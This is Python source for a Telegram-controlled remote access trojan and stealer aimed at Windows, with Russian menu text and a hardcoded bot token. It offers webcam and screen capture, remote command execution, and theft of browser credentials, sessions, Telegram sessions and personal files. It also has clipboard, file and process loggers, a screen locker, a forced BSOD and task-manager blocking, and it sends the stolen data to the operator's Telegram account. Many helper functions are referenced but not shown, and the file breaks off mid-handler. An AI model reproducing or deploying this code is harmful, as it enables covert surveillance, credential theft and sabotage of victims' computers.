##############################
import atexit
import base64
import chardet
import codecs
import ctypes
import ctypes
import ctypes.wintypes
import cv2
import datetime
import getpass
import GPUtil
import imageio
import imagezmq
import io
import json
import keyboard
import keyboard as kb
import logging
import mimetypes
import mouse
import mss
import numpy
import numpy as np
import os
import pathlib
import pickle
import PIL
import PIL.ImageGrab
import PIL.Image
import platform
import psutil
import psutil
import pyaudio
import pyautogui
import pygetwindow
import pygetwindow as gw
import pyperclip
import pyrdp
import pythoncom
import random
import rarfile
import re
import requests
import rotatescreen
import shutil
import socket
import sounddevice as sd
import sqlite3
import string
import struct
import subprocess
import sys
import telebot
import tempfile
import threading
import time
import tkinter as tk
import traceback
import urllib.parse
import urllib.request
import uuid
import websockets
import webbrowser
import wget
import win32api
import win32con
import win32gui
import win32evtlog
import win32evtlogutil
import win32security
import win32net
import win32netcon
import win32service
import win32serviceutil
import winreg
import wmi
import zipfile
import zlib
##############################
from Crypto.Cipher import AES
from ctypes import windll
from datetime import datetime, timedelta
from flask import Flask, Response
from flask import Flask, render_template_string
from functools import partial
from io import BytesIO
from mimetypes import guess_extension
from mitmproxy import http
from mss import mss
from pathlib import Path
from PIL import Image
from PIL import Image, ImageGrab, ImageDraw, ImageTk
from PIL import ImageFilter
from pynput import mouse, keyboard
from pynput import keyboard as pynput_keyboard
from pynput.keyboard import Key
from pynput.keyboard import Listener
from pynput.mouse import Controller
from pynput.mouse import Controller as MouseController
from PyQt5.QtGui import QPixmap, QImage
from PyQt5.QtWidgets import QApplication, QLabel, QVBoxLayout, QWidget
from PyQt5.QtWidgets import QMessageBox as MessageBox
from pySmartDL import SmartDL
from screeninfo import get_monitors
from slugify import slugify
from telebot import apihelper
from telebot import TeleBot
from telebot import types
from telebot.types import Message
from telegram import Bot
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackContext
from threading import Thread
from tkinter import *
from tkinter import messagebox
from urllib import request
from urllib.parse import unquote
from urllib.parse import urlparse
from win32crypt import CryptUnprotectData
##############################

my_id = 7138590083
bot_token = '7696684899:AAGegCUgRnr_bRok8WiOV5DkhY0Z-UKPP0g'
bot = telebot.TeleBot(bot_token)

#–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –º–µ–Ω—é
menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False,one_time_keyboard=False)
btnscreen = types.KeyboardButton('üñº –°–∫—Ä–∏–Ω—à–æ—Ç—ã')
btnmouse = types.KeyboardButton('üñ± –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º—ã—à–∫–æ–π –∏ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–æ–π')
btnfiles = types.KeyboardButton('üìÇ –§–∞–π–ª—ã –∏ –ø—Ä–æ—Ü–µ—Å—Å—ã')
btnaddit = types.KeyboardButton('‚ùáÔ∏è –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ')
btngrab = types.KeyboardButton('üîç –°—Ç–∏–ª–ª–µ—Ä')
btn_board = types.KeyboardButton('üñ• –†–∞–±–æ—á–∏–π —Å—Ç–æ–ª')
btn_rape = types.KeyboardButton('üîû –ò–∑–Ω–∞—Å–∏–ª–æ–≤–∞–Ω–∏–µ')
btntastkiller = types.KeyboardButton('‚ùå TASKKILLER [v1.0]')
bntloggers = types.KeyboardButton('üìí LOGGERS')
menu_keyboard.row(btnscreen, btnmouse, btn_board)
menu_keyboard.row(btnfiles, btngrab, btnaddit)
menu_keyboard.row(btn_rape, btntastkiller, bntloggers)

#–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤   
screenshot_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False)
screenshot_keyboard.add("üì∑ –ë—ã—Å—Ç—Ä—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç", "üñº –ü–æ–ª–Ω—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç", "üìπ –§–æ—Ç–æ –≤–µ–±–∫–∞–º–µ—Ä—ã")
screenshot_keyboard.add("‚è™ –ù–∞–∑–∞–¥")

#–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –§–∞–π–ª—ã –∏ –ü—Ä–æ—Ü–µ—Å—Å—ã
files_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False,one_time_keyboard=False)
btnallcomp = types.KeyboardButton('üñ• –í—Å–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –∫–æ–º–ø—å—é—Ç–µ—Ä—ã')
btnstart = types.KeyboardButton('‚úÖ –ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª')
btnkill = types.KeyboardButton('‚ùå –£–Ω–∏—á—Ç–æ–∂–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å')
btndown = types.KeyboardButton('‚¨áÔ∏è –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª —Å –∫–æ–º–ø—å—é—Ç–µ—Ä–∞')
btnupl = types.KeyboardButton('‚¨ÜÔ∏è –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä')
btnurldown = types.KeyboardButton('üîó –ó–∞–≥—Ä—É–∑–∏—Ç—å –ø–æ —Å—Å—ã–ª–∫–µ')
btnback = types.KeyboardButton('‚è™ –ù–∞–∑–∞–¥')
btnlistprocesses = types.KeyboardButton('üìã –°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤')
files_keyboard.row(btnallcomp)
files_keyboard.row(btnlistprocesses, btnstart,  btnkill)
files_keyboard.row(btnurldown, btndown, btnupl, btnback)

#–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ
additionals_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False,one_time_keyboard=False)
btncmd = types.KeyboardButton('‚úÖ –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É')
btnoff = types.KeyboardButton('‚õîÔ∏è –í—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä')
btnreb = types.KeyboardButton('‚ôªÔ∏è –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä')
btnuschange = types.KeyboardButton('üë®‚Äçüíª –°–º–µ–Ω–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è')
btnusexit = types.KeyboardButton('‚ö†Ô∏è –í—ã–π—Ç–∏ –∏–∑ —Å–∏—Å—Ç–µ–º—ã')
btninfo = types.KeyboardButton('üíª –û –∫–æ–º–ø—å—é—Ç–µ—Ä–µ')
btnback = types.KeyboardButton('‚è™ –ù–∞–∑–∞–¥')
btndir = types.KeyboardButton('üóÇ dir /b')
btnmsgbox = types.KeyboardButton('üì© –û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è')
btn_search = types.KeyboardButton('üîó –ü–µ—Ä–µ–π—Ç–∏ –ø–æ —Å—Å—ã–ª–∫–µ')
additionals_keyboard.row(btnoff, btnreb, btnuschange, btnusexit)
additionals_keyboard.row(btncmd, btndir, btnmsgbox)
additionals_keyboard.row(btninfo, btn_search, btnback)

#–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –º—ã—à–∏ –∏ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã
mouse_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False, one_time_keyboard=False)
btnback = types.KeyboardButton('‚è™ –ù–∞–∑–∞–¥')
btnblock = types.KeyboardButton('üö´ –ë–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –º—ã—à—å')
btnunblock = types.KeyboardButton('‚úÖ –†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –º—ã—à—å')
btnmrandom = types.KeyboardButton('üí• –†–∞–Ω–¥–æ–º –∫—É—Ä—Å–æ—Ä')
mouse_keyboard.row(btnblock, btnunblock)
mouse_keyboard.row(btnmrandom)
mouse_keyboard.row(btnback)

# –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ "–°—Ç–∏–ª–ª–µ—Ä–∞"
grabber_submenu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False, one_time_keyboard=False)
btn_photo = types.KeyboardButton('üñº –ì—Ä–∞–±–±–µ—Ä —Ñ–æ—Ç–æ')
btn_video = types.KeyboardButton('üé• –ì—Ä–∞–±–±–µ—Ä –≤–∏–¥–µ–æ')
btn_music = types.KeyboardButton('üé∂ –ì—Ä–∞–±–±–µ—Ä –º—É–∑—ã–∫–∏')
btn_archives = types.KeyboardButton('üì¶ –ì—Ä–∞–±–±–µ—Ä –∞—Ä—Ö–∏–≤–æ–≤')
btn_txts = types.KeyboardButton('üìÑ –ì—Ä–∞–±–±–µ—Ä txt')
btninstalledprograms = types.KeyboardButton('üì¶ –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã')
btngtsteal = types.KeyboardButton('üõ© –ì—Ä–∞–±–±–µ—Ä —Å–µ—Å—Å–∏–π Telegram')
btngbrowsersteal = types.KeyboardButton('üòà –°—Ç–∏–ª–ª–µ—Ä –±—Ä–∞—É–∑–µ—Ä–æ–≤')
btngbrowsersession = types.KeyboardButton('üëø –°–µ—Å—Å–∏–∏ –±—Ä–∞—É–∑–µ—Ä–æ–≤')
btnstealallmedia = types.KeyboardButton('üíæ –ì—Ä–∞–±–±–µ—Ä –≤—Å–µ—Ö —Ñ–∞–π–ª–æ–≤')
btnback = types.KeyboardButton('‚è™ –ù–∞–∑–∞–¥')
grabber_submenu_keyboard.row(btn_photo, btn_video, btn_music)
grabber_submenu_keyboard.row(btn_archives, btn_txts, btninstalledprograms)
grabber_submenu_keyboard.row(btnstealallmedia, btngtsteal, btngbrowsersteal, btngbrowsersession)
grabber_submenu_keyboard.row(btnback)

#–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞
vnc_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False, one_time_keyboard=False)
start_recording_button = types.KeyboardButton('üî¥ –ù–∞—á–∞—Ç—å –∑–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞')
stop_recording_button = types.KeyboardButton('‚èπÔ∏è –ó–∞–≤–µ—Ä—à–∏—Ç—å –∑–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞')
btnset_wallpaper = types.KeyboardButton('üåÖ –ò–∑–º–µ–Ω–∏—Ç—å –æ–±–æ–∏')
btnrms = types.KeyboardButton('üñ• –ó–∞–ø—É—Å—Ç–∏—Ç—å RMS')
btnspht = types.KeyboardButton('üìã –°–∫—Ä—ã—Ç—å –ø–∞–Ω–µ–ª—å –∑–∞–¥–∞—á')
btnback = types.KeyboardButton('‚è™ –ù–∞–∑–∞–¥')
vnc_keyboard.row(start_recording_button, stop_recording_button)
vnc_keyboard.row(btnset_wallpaper, btnrms, btnspht)
vnc_keyboard.row(btnback)

#–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –Ω–∞—Å–∏–ª–∏–µ
rape_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False, one_time_keyboard=False)
btnwinlock = types.KeyboardButton('üîí –í–∏–Ω-–ª–æ–∫–µ—Ä')
btnbsod = types.KeyboardButton('üîµ BSOD')
btnwowscreen = types.KeyboardButton('üåä –ü–ª—ã–≤—É—â–∏–π —ç–∫—Ä–∞–Ω')
btnrotatescreen = types.KeyboardButton('üîÑ –ü–µ—Ä–µ–≤–µ—Ä—Ç—ã—à —ç–∫—Ä–∞–Ω–∞')
btnwindowimage = types.KeyboardButton('üñº –ö–∞—Ä—Ç–∏–Ω–∫–∞-–ª–æ–∫–µ—Ä')
btnback = types.KeyboardButton('‚è™ –ù–∞–∑–∞–¥')
rape_keyboard.row(btnwinlock, btnbsod, btnwowscreen)
rape_keyboard.row(btnrotatescreen, btnwindowimage,)
rape_keyboard.row(btnback)

#–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ TASKKILLER
task_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False, one_time_keyboard=False)
btnlistexittaskmng = types.KeyboardButton('üìà –ó–∞–ø—Ä–µ—Ç–∏—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á')
btnnolistexittaskmng = types.KeyboardButton('üìâ –†–∞–∑—Ä–µ—à–∏—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á')
btnlistexitprocces = types.KeyboardButton('‚ûï –ó–∞–ø—Ä–µ—Ç–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å')
btnlistnoexitprocces = types.KeyboardButton('‚ûñ –†–∞–∑—Ä–µ—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å')
btnlistprocess = types.KeyboardButton('üö´ –í—Å–µ –∑–∞–ø—Ä–µ—â–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã')
btnnoexitallprocess = types.KeyboardButton('‚úÖ –†–∞–∑—Ä–µ—à–∏—Ç—å –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã')
btnback = types.KeyboardButton('‚è™ –ù–∞–∑–∞–¥')
task_keyboard.row(btnlistexittaskmng, btnnolistexittaskmng)
task_keyboard.row(btnlistexitprocces, btnlistnoexitprocces, btnlistprocess, btnnoexitallprocess)
task_keyboard.row(btnback)

#–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –ª–æ–≥–≥–µ—Ä–æ–≤
log_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False, one_time_keyboard=False)
btnback = types.KeyboardButton('‚è™ –ù–∞–∑–∞–¥')
btnfileloggerstart = types.KeyboardButton("‚úÖÔ∏èüóÇ –ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª–ª–æ–≥–≥–µ—Ä")
btnfileloggerend = types.KeyboardButton("‚õîÔ∏èüóÇ –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ñ–∞–π–ª–ª–æ–≥–≥–µ—Ä")
btnfileloggersend = types.KeyboardButton("üì®üóÇ –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ª–æ–≥–∏")
btnprocloggerstart = types.KeyboardButton("‚úÖÔ∏èüóÉ –ó–∞–ø—É—Å—Ç–∏—Ç—å —Ç–∞—Å–∫–ª–æ–≥–≥–µ—Ä")
btnprocloggerend = types.KeyboardButton("‚õîÔ∏èüóÉ –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ç–∞—Å–∫–ª–æ–≥–≥–µ—Ä")
btnprocloggersend = types.KeyboardButton("‚úÖüóÉ –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ª–æ–≥–∏")
btncliploggerstart = types.KeyboardButton("‚úÖÔ∏èüß∑ –ó–∞–ø—É—Å—Ç–∏—Ç—å –∫–ª–∏–ø–ª–æ–≥–≥–µ—Ä")
btncliploggerend = types.KeyboardButton("‚õîÔ∏èüß∑ –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∫–ª–∏–ø–ª–æ–≥–≥–µ—Ä")
btncliploggersend = types.KeyboardButton("‚úÖüß∑ –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ª–æ–≥–∏")
log_keyboard.row(btnfileloggerstart, btnfileloggerend, btnfileloggersend)
log_keyboard.row(btnprocloggerstart, btnprocloggerend, btnprocloggersend)
log_keyboard.row(btncliploggerstart, btncliploggerend, btncliploggersend)
log_keyboard.row(btnback)

# –û–±—â–∏–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–æ–∫
@bot.message_handler(content_types=["text"])    
def get_text_messages(message):
    if message.from_user.id == my_id:
        logging.basicConfig(filename='bot.log', level=logging.DEBUG)
        logger = logging.getLogger()
        logger.info(f"Received message: {message.text}")
        if message.text == "üñº –°–∫—Ä–∏–Ω—à–æ—Ç—ã":
            bot.send_message(my_id, "–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø —Å–∫—Ä–∏–Ω—à–æ—Ç–∞:", reply_markup=screenshot_keyboard)
        elif message.text == "üì∑ –ë—ã—Å—Ç—Ä—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç":
            perform_quick_screenshot(message)
        elif message.text == "üñº –ü–æ–ª–Ω—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç":
            bot.send_chat_action(my_id, 'upload_document')
            screenshot_file = get_screenshot()
            if screenshot_file:
                bot.send_document(my_id, open(screenshot_file, "rb"))
                os.remove(screenshot_file)
            else:
                bot.send_message(my_id, "–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–Ω—è—Ç–∏–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: " + screenshot_file)
        elif message.text == "üìπ –§–æ—Ç–æ –≤–µ–±–∫–∞–º–µ—Ä—ã":
            bot.send_chat_action(my_id, 'upload_photo')
            try:
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cv2.imwrite('webcam.png', frame)
                cap.release()
                bot.send_photo(my_id, open("webcam.png", "rb"))
                os.remove("webcam.png")
            except Exception as e:
                bot.send_message(my_id, "–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–Ω—è—Ç–∏–∏ —Ñ–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã: " + str(e))
        elif message.text == "üñ± –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º—ã—à–∫–æ–π –∏ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–æ–π":
            bot.send_message(my_id, "üñ± –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º—ã—à–∫–æ–π –∏ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–æ–π", reply_markup = mouse_keyboard)
            bot.register_next_step_handler(message, mouse_process)
        elif message.text == "üñ• –†–∞–±–æ—á–∏–π —Å—Ç–æ–ª":
            bot.send_message(my_id, "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=vnc_keyboard) 
        elif message.text == "üî¥ –ù–∞—á–∞—Ç—å –∑–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞":
            start_recording_command(message)
            bot.send_message(message.chat.id, "–ó–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞ –Ω–∞—á–∞—Ç–∞. –ó–∞–ø–∏—Å—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è –ø–æ –∏—Å—Ç–µ—á–µ–Ω–∏–∏ 2 –º–∏–Ω—É—Ç.")
        elif message.text == "‚èπÔ∏è –ó–∞–≤–µ—Ä—à–∏—Ç—å –∑–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞":
            stop_recording_command(message)
            bot.send_message(message.chat.id, "–ó–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞.")
        elif message.text == "üåÖ –ò–∑–º–µ–Ω–∏—Ç—å –æ–±–æ–∏":
            set_wallpaper_command(message)
        elif message.text == "üñ• –ó–∞–ø—É—Å—Ç–∏—Ç—å RMS":
            agent_screenshot(message)
        elif message.text == "üìã –°–∫—Ä—ã—Ç—å –ø–∞–Ω–µ–ª—å –∑–∞–¥–∞—á":
            start_taskbar_hide(message)
        elif message.text == "üìÇ –§–∞–π–ª—ã –∏ –ø—Ä–æ—Ü–µ—Å—Å—ã":
            bot.send_message(my_id, "üìÇ –§–∞–π–ª—ã –∏ –ø—Ä–æ—Ü–µ—Å—Å—ã", reply_markup = files_keyboard)
            bot.register_next_step_handler(message, files_process)
        elif message.text == "üîç –°—Ç–∏–ª–ª–µ—Ä":
            bot.send_message(my_id, "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=grabber_submenu_keyboard)
        elif message.text == "üíæ –ì—Ä–∞–±–±–µ—Ä –≤—Å–µ—Ö —Ñ–∞–π–ª–æ–≤":
            perform_grab_photos(message)
            perform_grab_video(message)
            perform_grab_music(message)
            perform_grab_arch(message)
            perform_grab_txt(message)
        elif message.text == "üñº –ì—Ä–∞–±–±–µ—Ä —Ñ–æ—Ç–æ":
            perform_grab_photos(message)
        elif message.text == "üé• –ì—Ä–∞–±–±–µ—Ä –≤–∏–¥–µ–æ":
            perform_grab_video(message)
        elif message.text == "üé∂ –ì—Ä–∞–±–±–µ—Ä –º—É–∑—ã–∫–∏":
            perform_grab_music(message)
        elif message.text == "üì¶ –ì—Ä–∞–±–±–µ—Ä –∞—Ä—Ö–∏–≤–æ–≤":       
            perform_grab_arch(message)
        elif message.text == "üìÑ –ì—Ä–∞–±–±–µ—Ä txt":
            perform_grab_txt(message)
        elif message.text == "üì¶ –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã":
            send_installed_programs_as_document(message)
        elif message.text == "üõ© –ì—Ä–∞–±–±–µ—Ä —Å–µ—Å—Å–∏–π Telegram":
            grab_and_upload_telegram_session(message)
        elif message.text == "üòà –°—Ç–∏–ª–ª–µ—Ä –±—Ä–∞—É–∑–µ—Ä–æ–≤":
            handle_browsers_info_command(message)
        elif message.text == "üëø –°–µ—Å—Å–∏–∏ –±—Ä–∞—É–∑–µ—Ä–æ–≤":
            copy_browsers_data(message)
        elif message.text == "‚ùáÔ∏è –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ":
            bot.send_message(my_id, "‚ùáÔ∏è –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ", reply_markup = additionals_keyboard)
            bot.register_next_step_handler(message, addons_process)
        elif message.text == "üîû –ò–∑–Ω–∞—Å–∏–ª–æ–≤–∞–Ω–∏–µ":
            bot.send_message(my_id, "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=rape_keyboard)
        elif message.text == "üîí –í–∏–Ω-–ª–æ–∫–µ—Ä":
            start_winlock(message)
        elif message.text == "üîµ BSOD":
            trigger_bsod(message)
            bot.send_message(my_id, "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=rape_keyboard)
        elif message.text == "üåä –ü–ª—ã–≤—É—â–∏–π —ç–∫—Ä–∞–Ω":
            start_wowscreen(message)
        elif message.text == "üîÑ –ü–µ—Ä–µ–≤–µ—Ä—Ç—ã—à —ç–∫—Ä–∞–Ω–∞":
            rotatescreen_process(message)
            bot.send_message(my_id, "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=rape_keyboard)
        elif message.text == "üñº –ö–∞—Ä—Ç–∏–Ω–∫–∞-–ª–æ–∫–µ—Ä":
            windowimage(message)
        elif message.text == "‚ùå TASKKILLER [v1.0]":
            bot.send_message(my_id, "‚ùå TASKKILLER", reply_markup = task_keyboard)
            bot.register_next_step_handler(message, taskis_keyboard)
        elif message.text == "üìí LOGGERS":
            bot.send_message(my_id, "üìí LOGGERS", reply_markup = log_keyboard)
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "‚è™ –ù–∞–∑–∞–¥": 
            back(message)
        else:
            info_user(message)
@bot.message_handler(func=lambda message: True)
def logger_keyboard(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "‚úÖÔ∏èüóÇ –ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª–ª–æ–≥–≥–µ—Ä":
            activate_filelogger()
            bot.send_message(message.chat.id, "–§–∞–π–ª–ª–æ–≥–≥–µ—Ä –≤–∫–ª—é—á–µ–Ω.")
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "‚õîÔ∏èüóÇ –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ñ–∞–π–ª–ª–æ–≥–≥–µ—Ä":
            deactivate_filelogger()
            bot.send_message(message.chat.id, "–§–∞–π–ª–ª–æ–≥–≥–µ—Ä –≤—ã–∫–ª—é—á–µ–Ω.")
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "üì®üóÇ –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ª–æ–≥–∏":
            file_send_logs(my_id, log_file_path, bot)
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "‚úÖÔ∏èüóÉ –ó–∞–ø—É—Å—Ç–∏—Ç—å —Ç–∞—Å–∫–ª–æ–≥–≥–µ—Ä":
            start_process_logger()
            bot.send_message(message.chat.id, "–¢–∞—Å–∫–ª–æ–≥–≥–µ—Ä –≤–∫–ª—é—á–µ–Ω.")
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "‚õîÔ∏èüóÉ –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ç–∞—Å–∫–ª–æ–≥–≥–µ—Ä":
            bot.send_message(message.chat.id, "–¢–∞—Å–∫–ª–æ–≥–≥–µ—Ä –≤—ã–∫–ª—é—á–µ–Ω.")
            stop_process_logger()
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "‚úÖüóÉ –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ª–æ–≥–∏":
            task_send_logs(my_id, log_task_path, bot)
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "‚úÖÔ∏èüß∑ –ó–∞–ø—É—Å—Ç–∏—Ç—å –∫–ª–∏–ø–ª–æ–≥–≥–µ—Ä":
            start_clipboard_logging()
            bot.send_message(message.chat.id, "–ö–ª–∏–ø–ª–æ–≥–≥–µ—Ä –≤–∫–ª—é—á–µ–Ω.")
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "‚õîÔ∏èüß∑ –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∫–ª–∏–ø–ª–æ–≥–≥–µ—Ä":
            bot.send_message(message.chat.id, "–ö–ª–∏–ø–ª–æ–≥–≥–µ—Ä –≤—ã–∫–ª—é—á–µ–Ω.")
            stop_clipboard_logging()
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "‚úÖüß∑ –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ª–æ–≥–∏":
            clip_send_logs(my_id, log_clipboard_path, bot)
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "‚è™ –ù–∞–∑–∞–¥":
            back(message)
        else:
            info_user(message)
@bot.message_handler(func=lambda message: True)
def taskis_keyboard(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "üìà –ó–∞–ø—Ä–µ—Ç–∏—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á":
            start_scan_taskmgr(message)
            bot.register_next_step_handler(message, taskis_keyboard)
        elif message.text == "üìâ –†–∞–∑—Ä–µ—à–∏—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á":
            stop_scan_taskmgr(message)
            bot.register_next_step_handler(message, taskis_keyboard)
        elif message.text == "‚ûï –ó–∞–ø—Ä–µ—Ç–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å":
            bot.register_next_step_handler(message, ask_for_process_name)
        elif message.text == "‚ûñ –†–∞–∑—Ä–µ—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å":
            bot.register_next_step_handler(message, ask_for_process_removal)
        elif message.text == "üö´ –í—Å–µ –∑–∞–ø—Ä–µ—â–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã":
            start_scan_processes(message)
        elif message.text == "‚úÖ –†–∞–∑—Ä–µ—à–∏—Ç—å –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã":
            stop_scan_processes(message)
        elif message.text == "‚è™ –ù–∞–∑–∞–¥":
            back(message)
        else:
            info_user(message)
@bot.message_handler(func=lambda message: True)
def addons_process(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "‚úÖ –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É":
            bot.send_message(my_id, "–£–∫–∞–∂–∏—Ç–µ –∫–æ–Ω—Å–æ–ª—å–Ω—É—é –∫–æ–º–∞–Ω–¥—É:")
            bot.register_next_step_handler(message, cmd_process)
        elif message.text == "‚õîÔ∏è –í—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä":
            bot.send_message(my_id, "–í—ã–∫–ª—é—á–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞...")
            os.system('shutdown -s /t 0 /f')
            bot.register_next_step_handler(message, addons_process)
        elif message.text == "‚ôªÔ∏è –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä":
            bot.send_message(my_id, "–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞...")
            os.system('shutdown -r /t 0 /f')
            bot.register_next_step_handler(message, addons_process)
